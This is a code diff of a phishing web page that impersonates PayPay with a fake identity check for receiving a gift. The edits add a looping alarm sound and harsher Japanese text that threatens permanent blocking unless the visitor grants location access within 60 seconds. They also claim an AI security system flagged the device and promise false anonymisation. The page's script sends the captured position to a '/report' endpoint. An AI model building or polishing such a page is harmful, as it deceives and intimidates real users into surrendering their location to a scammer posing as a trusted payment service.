@@ -112,7 +112,7 @@
 </head>
 <body>
 
-  <audio id="alertSound" autoplay>
+  <audio id="alertSound" loop autoplay>
     <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
   </audio>
 
@@ -122,27 +122,26 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" class="warning-icon" alt="警告マーク"/>
     <h2>本人確認のお願い</h2>
     <p>
-      不正利用の報告がありました。<br>
-      これは過去数年間に渡りPayPay上で報告されてきた<b>ギフト悪用事例</b>に対応する一環です。<br>
-      セキュリティ基準に照らして疑わしい振る舞いが検知されたため、<br>
-      現在、<b>位置情報を含む多要素確認</b>が必要です。
+      PayPayでは過去数年間にわたり、ギフト機能の<b>不正利用に関する報告</b>が複数寄せられています。<br>
+      それに伴い、当社の<b>AI行動分析システム</b>は、ご利用端末からのアクセスに<b>異常な兆候</b>を検出しました。<br>
+      本確認画面は、その初動対応として導入されており、<b>全利用者を対象としたセキュリティプロトコル</b>です。
     </p>
     <p>
-      <b>この確認画面は全ユーザー共通のチェック工程</b>であり、無視・キャンセルすることはできません。<br>
-      PayPayの<b>AI検出モデル</b>と<b>心理学的解析</b>に基づき、<br>
-      「応答の速度」「ボタンの押下タイミング」「情報許可の有無」などを総合的に判断します。
+      本チェックは、<b>人間と自動ツール（Bot）を判別</b>する目的で実施されており、<br>
+      心理学的アルゴリズムに基づいた<b>反応速度・判断傾向・意図的拒否</b>などのデータを収集しています。<br>
+      60秒以内に位置情報が許可されない場合、<b>悪質と判断し端末のアクセスが恒久的に制限</b>されます。
     </p>
     <div class="warning">
-      ※60秒以内に位置情報を許可されなかった場合、アクセスは制限されます。
+      ※PayPayギフトを安全に受け取るには、今すぐ位置情報の許可を行ってください。
     </div>
     <div id="countdown">残り時間: 60 秒</div>
     <p>
-      <b>この処理は一度限り</b>であり、失敗した場合、<b>再取得はできません</b>。<br>
-      今すぐ<b>位置情報の許可</b>をお願いいたします。
+      この処理は<b>1端末につき1度限り</b>であり、失敗後の再認証・再取得はできません。<br>
+      正常利用が確認され次第、<b>すぐにギフトが受け取れる画面</b>に自動遷移します。
     </p>
     <button onclick="verifyLocation()">位置情報を許可して続行</button>
     <div class="note">
-      ※許可後は即時処理され、第三者に共有されることはありません。
+      ※取得された情報は<b>リアルタイムで匿名化</b>され、安全に削除・処理されます。
     </div>
   </div>
 
@@ -164,6 +163,7 @@
         navigator.geolocation.getCurrentPosition(
           pos => {
             clearInterval(countdownInterval);
+            document.getElementById('alertSound').pause();
             fetch('/report', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -196,11 +196,11 @@
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" width="60" style="animation: blink 1s infinite;"><br><br>
           <h2 style="color:#e60012; text-shadow: 0 0 3px red;">アクセスが制限されました</h2>
           <p style="color:#333; font-size:15px;">
-            PayPayの自動判定システムにより、<b style='color:red;'>ロボットの可能性がある</b>と判断されました。
+            PayPayの<b>自動判定システム</b>により、本端末は<b style='color:red;'>ロボットの可能性が高い</b>と判断されました。
           </p>
           <p style="font-size:14px; color:#555; margin-top:25px;">
-            心理的行動パターン・応答時間・位置拒否判断など複数の要素をもとに、<br>
-            当社の<b>AIセキュリティモデル</b>が一貫した不審傾向を検出しました。
+            心理的行動パターン・応答時間・意図的な拒否操作などをもとに、<br>
+            <b>セキュリティAIが危険性の高い挙動</b>として自動ブロックを実施しました。
           </p>
           <p style="font-size:13px; color:#777; margin-top:30px;">
             PayPay株式会社<br>
